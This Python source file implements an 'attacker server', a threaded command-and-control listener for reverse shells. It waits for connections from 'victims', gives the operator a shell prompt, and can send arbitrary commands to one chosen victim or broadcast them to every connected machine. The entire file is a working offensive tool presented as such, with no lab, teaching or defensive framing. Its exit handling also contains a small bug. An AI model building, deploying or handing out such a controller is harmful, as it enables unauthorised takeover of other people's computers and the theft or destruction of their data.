import socket
import threading

class AttackerServer:
    def __init__(self, host_ip, host_port):
        self.host_ip = host_ip
        self.host_port = host_port
        self.server = None
        self.clients = []

    def start_conn(self):
        print("####################################")
        print("######### Attacker Server #########")
        print("####################################")

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host_ip, self.host_port))

        print("Msg: Server Initiated...")
        print("Msg: Listening for Victims")

        self.server.listen(5)  # Listen for multiple connections
    

        while True:
            client_socket, client_addr = self.server.accept()
            print("Msg: Received Connection from", client_addr)
            self.clients.append((client_socket, client_addr))
            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))
            client_handler.start()

    def handle_client(self, client_socket):
        while True:
            interface = '[+] ' + str(client_socket.getpeername()[0]) + " :sh$ "
            command = input(interface)

            if not command.strip():  # If empty command is given, continue listening
                continue

            if command.lower() == "exit":  # Handle exit command
                client_socket.close()
                self.clients.remove((client_socket, None))
                print("Msg: Connection closed")
                break

            if command.lower() == "list":
                print("Connected Devices:")
                for index, (client, addr) in enumerate(self.clients, start=1):
                    print(f"{index}. {addr[0]}")

            # Send command to selected devices
            elif command.startswith("sendto"):
                parts = command.split(" ", 1)
                if len(parts) == 2:
                    try:
                        device_index = int(parts[1]) - 1
                        target_socket, _ = self.clients[device_index]
                        target_command = input("Enter command to send: ")
                        target_socket.send(target_command.encode())
                    except (ValueError, IndexError):
                        print("Invalid device index.")
                else:
                    print("Usage: sendto <device_index>")

            # Send command to all devices
            else:
                for client_socket, _ in self.clients:
                    client_socket.send(command.encode())

    def close_connections(self):
        for client_socket, _ in self.clients:
            client_socket.close()
        self.clients = []

if __name__ == "__main__":
    attacker_ip = '127.0.0.1'  # Replace with attacker's IP address
    attacker_port = 4000  # Choose a port for the attacker server

    attacker_server = AttackerServer(attacker_ip, attacker_port)
    attacker_server.start_conn()
